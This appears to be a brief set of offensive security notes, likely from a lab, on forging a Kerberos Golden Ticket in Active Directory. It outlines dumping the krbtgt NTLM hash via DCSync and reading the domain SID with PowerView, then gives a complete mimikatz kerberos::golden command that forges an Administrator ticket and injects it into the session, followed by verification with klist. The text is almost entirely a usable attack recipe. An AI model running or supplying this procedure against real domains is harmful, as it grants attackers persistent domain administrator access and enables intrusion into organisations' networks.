	Desc:
		Use krbtgt hash ntlm to sign tickets, signed tickets can always be trusted blindly
	Usage:
		Try with DCsync attack to auth krbtgt, get the NTLM hash
		Obtain the SID value from the domain with Get-DomainSID  from PowerView
		Then use mimikatz to create a ticket:
			cmd-session mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
		Passing the ticket to current session
		Verify with klist.exe after exiting mimikatz
`